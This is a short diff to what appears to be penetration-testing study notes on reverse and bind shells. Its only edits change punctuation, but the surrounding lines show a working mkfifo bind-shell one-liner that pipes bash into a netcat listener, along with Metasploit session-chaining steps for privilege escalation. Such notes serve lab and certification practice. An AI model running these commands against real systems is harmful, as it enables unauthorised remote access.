@@ -49,7 +49,7 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for reverse shells and she
 
 → Switch to a **bind shell**: you open a listener on the TARGET and connect TO it from Kali, so no outbound traffic from the target required.
 
-Linux bind shell (mkfifo — no nc -e required):
+Linux bind shell (mkfifo, no nc -e required):
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f
 ```
@@ -85,7 +85,7 @@ curl http://target:8080/shell/
 
 ### Got a Metasploit session but need to run a local privilege escalation module on top of it
 
-→ Use **session chaining** — background the current session, run the local exploit with `SESSION` pointing at it:
+→ Use **session chaining**, background the current session, run the local exploit with `SESSION` pointing at it:
 ```
 # In msfconsole:
 background          # or Ctrl-Z
